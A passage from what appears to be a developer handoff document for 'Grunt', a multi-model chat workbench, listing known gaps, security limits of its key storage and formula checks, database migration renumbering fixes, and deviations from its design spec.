(mode `0600` on POSIX; a documented no-op on Windows, where the file ends up
world-readable-equivalent). Stated plainly, from `container.ts`'s own
comment: **this protects against casual disclosure and backup/copy leakage
where the key file gets left behind by accident — it is not a defense
against local filesystem access.** Anyone who can read the encrypted file
can read the key file sitting next to it and decrypt everything. No OS
keychain integration exists (`Windows cmdkey` can set a credential but the
OS won't hand the password back out via CLI, so a keychain-backed store
couldn't round-trip reliably; macOS/Linux keychains were never built either)
— the encrypted-file store is the only option, and it warns loudly about
this on startup.

## Known gaps

- **The web store's message map is never pruned per chat.** `Thread.tsx`'s
  own comment: *"`messages` in the store is a flat, cross-chat pool — every
  message loaded or streamed into this session, never scoped or evicted per
  chat."* Correct behaviour is achieved by scoping at the point of use
  (`chatMessages`, filtered by `chatId`, before any tree computation) rather
  than by the underlying store ever forgetting anything — so it's a
  memory-growth concern over a long session with many chats visited, not a
  correctness bug.
- **`list_dir` holds no verifiable handle.** Covered above under TOCTOU —
  repeating it here because it's the sharpest instance of "narrowed, not
  closed": Node has no fd-based `readdir`, so this one is structural, not a
  matter of writing a tighter check.
- **The Inspector (and the Settings > MCP Servers panel) poll every 4s
  rather than pushing.** Deliberate, per `Inspector.tsx`'s own comment: MCP
  health, grants, and the audit trail each change on a different, unrelated
  timeline with no existing push channel to piggyback on, unlike the thread
  itself (SSE-driven). A Revoke action removes its row optimistically so it
  doesn't *look* laggy, but the other sections can be up to 4s stale.
- **Attachment uploads are capped at 25MB, but not streamed.**
  `packages/server/src/routes/attachments.ts`'s `MAX_ATTACHMENT_BYTES`
  cap is enforced by first trusting the multipart `File`'s self-reported
  `.size`, then re-checking the real byte length — but that second check
  only happens after `Buffer.from(await file.arrayBuffer())` has already
  read the entire file into memory. The cap bounds how much memory one
  upload can ultimately hold, but does not stop the bytes from being
  buffered in full before the size is verified; a true streaming
  implementation would enforce the limit while reading, not after.
- **Abandoned unsent attachments are never collected.** An uploaded
  attachment that's never sent (`messageId` stays `null`) and never
  explicitly deleted keeps its blob alive indefinitely — the GC only runs on
  an explicit delete, a chat/profile/connection cascade, or the startup
  sweep, none of which fire just because time has passed. Uploading a file
  and abandoning the chat without sending or removing it leaks that blob
  until someone deletes it by hand.
- **Blobs in the legacy shared `attachments/` directory are never
  garbage-collected.** `BlobStore`'s `legacyRoot` is read-only by design (see
  Attachments above) — the sweep only ever touches the per-database write
  root, so anything left over from before the per-database fix sits there
  permanently, servable but never reclaimed.
- **`:memory:` databases' temp attachments roots are cleaned up on shutdown
  now, but older ones from before that fix may still be sitting in `%TEMP%`.**
  `createContainer`'s `close()` now removes a `:memory:` run's own
  `grunt-attachments-*` temp directory (`container.ts`), but that fix is
  itself recent — `blob-store.ts`'s own comment notes 28 such directories
  were found already accumulated on this machine before it landed. Safe to
  delete by hand; nothing references them once their server process exits.
- **A paired machine is trusted with what syncs.** It can change any
  synced row: rename chats, delete profiles (and so their chats), re-point
  a connection whose key it already has. It can't read or overwrite this
  machine's other secrets, switch on sharing of a key kept here, re-point a
  kept-here connection, or name a blob outside the store (all refused, with
  tests). Pairing is between your own machines; treat a paired machine as
  you would your own account on it.
- **Changes from another machine show up after a refresh of the lists.**
  A sync reloads the chat list, projects, profiles and connections, and
  open chats reload their messages; there's no finer-grained live update.
- **Project memory is summarised only by the machine a chat runs on**, so
  two machines don't redo and overwrite each other's notes. Its version
  history stays on the machine that wrote it.
- **Chats are only filed under projects with claude.ai's chat list.** The
  export doesn't record which project a conversation was in; without the
  saved list every imported chat lands in No project.
- **Cowork's own outputs aren't imported.** A session's `outputs/` folder
  (files it wrote) stays where it is, and images inside tool results become
  notes.
- **Importing again with memory ticked folds claude.ai's notes in again.**
  The learned note and the project notes take whatever the model makes of
  the notes a second time. Untick the box for a re-run.
- **A second import doesn't add messages a chat gained on claude.ai since
  the first.** A chat that is already here is skipped whole, so one carried
  on in Grunt keeps its own branch; the preview and the report count the
  chats this affects.
- **An imported project's docs folder does nothing until there is a
  workspace.** Extra folders only apply to a chat with a workspace folder
  (spec 2026-10-07-extra-folders), and imported projects have none, so the
  report says so for each docs folder.
- **Reading an export blocks the server for a moment.** `JSON.parse` of the
  conversations (about 54 MB for 486 conversations) and inflating the ZIPs
  run on the main thread, about a third of a second here; a much larger
  export would hold up other requests for longer. A worker would fix it.
- **Remote access, phase 1** (spec 2026-10-12-remote-access): no passkeys,
  no list of signed-in devices (only *Sign out everywhere*), sessions don't
  survive a restart, certificate files aren't reloaded without a restart,
  no Web Push for approvals, and no phone layout work beyond the sidebar
  footer wrapping so Sign out stays reachable (the spec's §7 lists the other
  gaps at 390 px). iOS and Android trust of the hand-made CA is checked only
  on real devices.
- **MCP sign-in, phase 2** (Deck #931). Not built: registering the public and loopback redirect addresses side by side (each change of address registers again), revoking tokens at the provider on sign-out (RFC 7009), a fixed callback port for providers that pin it, a sign-in button in the Inspector, and URL-based client IDs (SEP-991). In open or token mode with `--host ::1` or one specific non-loopback address, `127.0.0.1` isn't served, so the callback can't arrive; paste-back still works. Tool-call error text from an MCP server isn't redacted (only lifecycle errors are). After a URL change and a new sign-in, a stale refresh on the old URL can force one more sign-in; it never discloses a token.
- **Dependency advisories** -- cleared: `npm audit --omit=dev` reports 0 after upgrading to the latest v6 line (`ai@6.0.300`, `@ai-sdk/provider-utils@4.0.57` -> `undici@6.29.0`), `hono@4.13.12` and a plain `npm audit fix` for the MCP SDK's transitive deps. `ai` stays pinned to v6; never `npm audit fix --force`.
- **Office files (Deck #928): the final writers' output hasn't been opened
  in Office.** The tests read the files back as XML. An early probe on
  2026-10-12, with throwaway files and not the final writers, had Excel 16
  compute SUM, IF with `<`, `&` and quotes, and a reference into a sheet name
  with a space; Word showed Heading 1 and a table; PowerPoint opened a deck.
  The spreadsheet writes formulas with no cached values and asks Excel to
  calculate on open, so a downloaded file opens in Protected View, where Excel
  doesn't recalculate, and viewers that don't calculate (Outlook, Explorer or
  Finder preview panes, phone viewers, Drive previews) show formula cells
  empty or 0. By hand, once: ask a Claude Code profile and an API profile for a
  one-page memo, a budget with a formula on a second sheet that refers to the
  first, and a five-slide deck; download each and open it.
  - Excel: click Enable Editing first; before that, formula cells may look
    empty or 0 (note what a preview pane shows). No repair prompt; formulas show values, not `#NAME?` or `#REF!`,
    including newer functions (XLOOKUP, FILTER, SORT and the ten whose
    `_xlfn.` prefix was set from memory, not Microsoft's list: XMATCH,
    VALUETOTEXT, ARRAYTOTEXT, PERCENTOF, TRIMRANGE, REGEXTEST, REGEXEXTRACT,
    REGEXREPLACE, ENCODEURL, DBCS); a cross-sheet reference; an unquoted
    non-ASCII sheet name (`Données!A1`). Dynamic arrays are written without
    spill metadata, so FILTER/SORT/SEQUENCE may show as `@FILTER` and return
    one value.
  - Word: Heading 1/2 are Word's own styles; numbered lists restart; tables
    and links look right.
  - PowerPoint: 16:9; slide numbers (none on title slides); notes; a table of
    at the 30-row cap (`MAX_TABLE_ROWS`; the layout sets no row height, so
    it may run off the slide); section slide colours.
  - Attach a real Word file, Excel workbook (with dates and formulas) and
    deck on each profile and ask questions only their contents answer.
  - Known limits meanwhile: no charts or images in made files, no templates,
    no .doc/.xls/.ppt or OpenDocument, no previews of Office files already
    in the workspace, no argument-count check on formulas (`=ROUND(1)` is
    accepted and may make Excel complain), and a hostile uploaded file can
    hold the upload request for about 10-15 seconds (up to 64 MB of parts at
    4-6 MB/s).
  - Word fidelity gaps: an ordered list's start number is ignored; a
    reference-style link loses its URL; lists, tables and headings inside a
    blockquote lose the quote styling; link targets with spaces aren't
    percent-encoded; the preview loads remote images through `MarkdownBody`
    while the .docx writes `[Image: alt]`.
- **Live artifacts in the desktop window are unchecked.** The probe
  (`packages/web/e2e/live-probe.spec.ts`) covers Chromium only; run its
  checks by hand in WebView2. Phase 2: forward live calls to the chat's *Runs
  on* machine, a bundled chart library, free-text and date parameters, and the iframe `csp`
  attribute (CSP Embedded Enforcement) in Chromium and WebView2 so a document
  that replaces a live page has to take the live policy too. Phase 3: WebView2
  `FrameNavigationStarting` to stop a live page leaving. Until then the
  navigation guard only notices navigations that commit: a 204 or 205 answer
  (or a download) leaves the page open, and a document that replaces the page
  before its first load is answered as the page while the view is open.
- **Live grants are bound to the MCP server id.** A grant now needs the
  tool's name and its server's id to match. A renamed or replaced server
  needs a fresh OK. Live grants made before this change have no server id,
  so they need approving again; there is no backfill.
- **Live artifacts by hand:** a dashboard from the real Nextcloud server
  (`tasks_list`, `cal_list` with `from: 'today'`, `to: '+7d'`) written from
  the guidance alone; an `update` that leaves the calls alone keeps the
  approval and one that changes args asks for that call only; a Claude Code
  chat making one with relayed tool names; viewing from the paired laptop.
- **Scheduled tasks phase 2 isn't built.** Schedules don't sync or move between machines, there are no browser or phone notifications, no "every N hours" or cron rules, no per-schedule timeout and no attachments in the prompt. Deleting a chat or project removes its schedules without a mention in the delete dialog.

## Integration (feat/cowork-parity-all)

The sandbox, Office files, remote access with MCP sign-in, thread cards,
scheduled tasks and live artifacts were built on separate branches from
8dcbd36 and merged here. Each took the next free migration number on its own
branch, so they were renumbered once merged. The final order is:

- 022 `chat-plan-mode`
- 023 `schedules`
- 024 `artifact-version-live`
- 025 `mcp-oauth`

**021 is a trap.** It is kept free for the chat-unread migration, but the
runner only applies versions above the database's `user_version`. A database
that this branch, or any feature branch here, has taken to 22-25 would skip a
021 committed later: silently, with no error. So chat-unread must land on dev
and be merged in here before this branch runs on a database that matters. If
it can't, give it a number after 025, or add its column by hand to every
database already past 21. A dev database at 20, or at 21 with chat-unread,
runs 022 to 025 normally.

The runner trusts `user_version`, so a dev database that a feature branch
migrated under another numbering can't come here as it is. Migration 025
checks for that: if `mcp_server.oauth` is already there, it stops with an
error that points here, rather than skipping or failing on a bare
duplicate-column error. Each migration commits on its own, so the ones before
025 still run. Check `PRAGMA user_version` first, with Grunt stopped:

- **From `feat/remote-access-build`** (022 was `mcp-oauth`: it has
  `mcp_server.oauth` but no `chat.plan_mode`):
  - At 22 (not yet opened here): `ALTER TABLE mcp_server DROP COLUMN oauth;`
    then `PRAGMA user_version = 20;`. The runner then adds 022 to 025. The
    sign-in summaries (account, time, a hand-registered client ID) go with
    the column, so a signed-in MCP server may need signing in again.
  - At 24 (opened here once: 023 and 024 ran, then 025 stopped):
    `ALTER TABLE chat ADD COLUMN plan_mode INTEGER NOT NULL DEFAULT 0;` then
    `PRAGMA user_version = 25;`. This keeps the sign-in data. Don't use the
    first fix here: the runner would then try to create `schedule` again.
- **From this branch before live artifacts were merged** (commits b4bc881 to
  5013bb6, where 024 was `mcp-oauth`): at 24, with `mcp_server.oauth` but no
  `artifact_version.live`, whether or not it has been opened since (025 stops
  before changing anything). Run `ALTER TABLE artifact_version ADD COLUMN live
  TEXT;` then `PRAGMA user_version = 25;`.
- **Fine as it is:**
  - From `dev`, `feat/cowork-parity` (the sandbox) or
    `feat/office-files-build`: 20, or 21 with chat-unread.
  - From `feat/thread-cards-build`: 23 if migrated before b55da3e, or 24 from
    b55da3e on (that commit added `024-artifact-version-live`). Those numbers
    mean the same here, and it runs the rest.

## Deviations from the v2 spec and plan

| Plan or spec said | Built | Why |
| --- | --- | --- |
| Migrations numbered from 005 | 011-013 | v1 work after the plan was written had already used up to 010 |
| `@peculiar/x509` for the node certificate | A small hand-written DER encoder (`peer/x509.ts`), which since remote access also makes `--tls auto`'s local CA and server certificate (SANs, key usages, key ids) | Avoids a new dependency for a few fixed certificate shapes; Node signs and parses certificates, it just can't build one |
| `undici` Agent for the pinned client | `node:tls` + `node:http` with `createConnection` (`peer/client.ts`) | No new dependency, and the fingerprint is checked before any byte (the token included) is written |
| Pairing MAC: `HMAC(code, fpA ‖ fpB)` | HMAC with a key derived by scrypt (N=2^14, r=8) from the code, salted with both fingerprints; the answer must come within 15 s | A security review showed a captured MAC of an 8-character code (2^40 guesses) falls to a GPU well inside the code's 10 minutes; the spec's "impractical" was wrong |
| Messages are insert-only | Last writer wins by stamp | A retried reply and *keep* marks change a message in place; insert-only would never deliver them |
| — | Projects and project memory sync too | They were added to v1 after the spec was written |
| — | `sync_secret` (keep the key here) is each machine's own setting, not synced | Otherwise a peer could switch it back on and be sent the key |
| The InMemoryStore mirrors change tracking | Change tracking is SQLite-only (triggers); sync tests use real SQLite stores | The fake would need its own change log on every repository for no gain over testing the real thing |
| `apply` refuses every `location_path` row for this machine | Refuses them only when this machine already has a path for that location | Adopting a location (Task 44) writes the other machine's path, which that machine needs to resolve the chats it was given |
| `GET /fs/dirs` forwarded with `?node=` | Never mounted on the peer listener | It lists directories anywhere on the machine; see What is NOT built |
| `WorkspaceStatus.hint.nodeName` | `hint.nodeId` | The UI names machines from the paired list; the server needn't |
| Task 40: try a Node SEA first, else ship a pinned `node` | Ships the build machine's own `node.exe` beside an esbuild bundle (`packages/server/scripts/bundle.mjs`), with the Claude Agent SDK, its native Claude Code runtime and `unpdf` copied beside the bundle rather than bundled | The Agent SDK starts a 237 MB per-platform native runtime and unpdf loads PDF.js from its own folder; neither survives bundling or a SEA. Shipping the node that ran the tests avoids a download and checksum step for now; a pinned, CI-downloaded node comes with the release workflow |
| Office files (Deck #928): the server bundle gains the writers | `docx` 9.8.1, `write-excel-file` 4.1.1, `pptxgenjs` 4.0.1 and the mdast/GFM parser are bundled, not copied beside it. `cli.js` is 5.59 MB and the new `render-worker.js` 1.93 MB: 7.51 MB together, up from 4.59 MB | The writers are plain JS and bundle cleanly. `npm audit` reports `image-size` (high) through `pptxgenjs`: the ES build Grunt bundles never imports it and Grunt never passes images. Don't run `npm audit fix --force` (it would also move `ai` to v7). `bundle:smoke` makes one file of each kind through the bundle |
| Spec: a spreadsheet formula check refuses a list of named functions | An allowlist of Excel's built-in worksheet functions behind a fail-closed tokenizer, with a short list refused by name; `formulaForFile` is the one source of the text written | A security review showed the denylist incomplete (STOCKHISTORY, TRANSLATE, INFO, CELL, INDIRECT...) and bypassable by spacing, prefixes and LET/LAMBDA aliases; what was checked has to be exactly what's written. It refuses some valid workbooks (INDIRECT, CELL, INFO, LET, LAMBDA, named ranges, 3-D references, `@`, `#`); the ~500-entry list could also miss a function |
| Spec: a document has no checks beyond the 1 MB cap | Limits on characters, lines, table rows and cells, indent, quote depth and formatting marks | The Markdown parser is super-linear on some shapes (200 KB of `**a**` took about 2 minutes). The limits are early, clear errors; the Worker is what actually bounds it |
| Spec: files are made in the server's thread | Made in a `worker_threads` Worker: 512 MB heap, 20 s limit, two at a time | The pre-checks could be bypassed (wide tables, pipe-free GFM rows, nested lists); only a limit that can stop the work closes that class. Costs a worker start per download and a second bundle entry |
| The plan: `pptx.write()` | `pptx.stream()` with compression | `write()` ignores compression in pptxgenjs 4.0.1 (a 274 KB spec made a 99-113 MB file); the biggest allowed deck is now under 5 MB |
| Spec: test ZIPs built with `fflate` | The existing `makeZip` test helper | The same fixtures from XML strings without a new dev dependency |

## Deviations from the original spec

All deliberate, all recorded at the time in the plan's Global Constraints:

| Spec said | Built | Why |
| --- | --- | --- |
| pnpm | npm workspaces | pnpm wasn't installed on the build machine; installing global tooling overnight was declined |
| Node 26 | Node 24.16.0 | What was on the machine — not a rejection of 26 for any `node:sqlite`/FTS5 reason, just "neither pnpm nor Node 26 was installed" |
| FTS5 with a `LIKE` fallback | FTS5 only, no fallback | FTS5 was verified present on this build, so the fallback would have been dead code |
| `.sql` migration files | Inlined as TypeScript string constants | `tsc` only emits `.js`/`.d.ts` — a plain `.sql` file is never copied into `dist/`, so a built package would silently ship without its migrations. Inlining removes that packaging failure mode at the cost of losing standalone `.sql` syntax highlighting |
| — | `node:sqlite` imported via `createRequire`, not a static `import` | `node:sqlite` has no unprefixed alias, and the vite-node version vitest 2.x pins hardcodes its builtin-module allowlist without it — a plain `import` resolves to the bare specifier `"sqlite"` under vitest and fails. `createRequire` is a function call, not an import declaration, so it bypasses vite-node's static rewriting and hits Node's own loader, which resolves it correctly both under vitest and under plain `node`. Verified the built `dist/db.js` uses the identical call, so tests and the shipped server agree — this isn't a test-only shim. Revisit once vitest moves past whatever vite-node version fixes the allowlist |

## Where to look

| Document | What it is |
| --- | --- |
| `README.md` | Install, run, add a connection/profile via the Settings UI (or curl), the mock-provider walkthrough |
| Collectives `Products/Grunt/Design/Specs/2026-08-12-grunt-multi-model-chat-workbench-design` | The original design spec — architecture, data model, permission model, error taxonomy |
| Collectives `Products/Grunt/Design/Plans/2026-08-12-grunt-v1` | The 31-task implementation plan this was originally built from, with the full milestone breakdown and code-level detail for M0–M3 |
| `packages/core/src/domain/paths.ts`, `packages/tools/src/fs-tools.ts` | The containment/TOCTOU/hard-link mechanics and their residuals, documented in-module — read these directly rather than trusting a paraphrase, this one included |
| `packages/store-sqlite/src/blob-store.ts`, `packages/store-sqlite/src/blob-gc.ts` | The per-database attachment roots, the legacy-root fallback, and the GC sweep — same rule: read the module comments directly |

## If you're picking this back up

The natural next steps, roughly in order of value:
1. Try two physical machines: pair the PC and the laptop over the LAN (allow the firewall prompt on Private networks only), then over the VPN. `docs/desktop-checklist.md` has the steps.
2. Tasks 40-41: installers and a bundled Node runtime, so the app doesn't need this checkout.
3. The tray's machine status line, and the small v2 UI gaps under What is NOT built.
4. Abandoned unsent attachments and the legacy shared blob directory are the two remaining places disk usage can grow without bound (see Known gaps above).
5. Re-run `npm audit --omit=dev` periodically; evaluate the `ai@7` migration on its own terms.
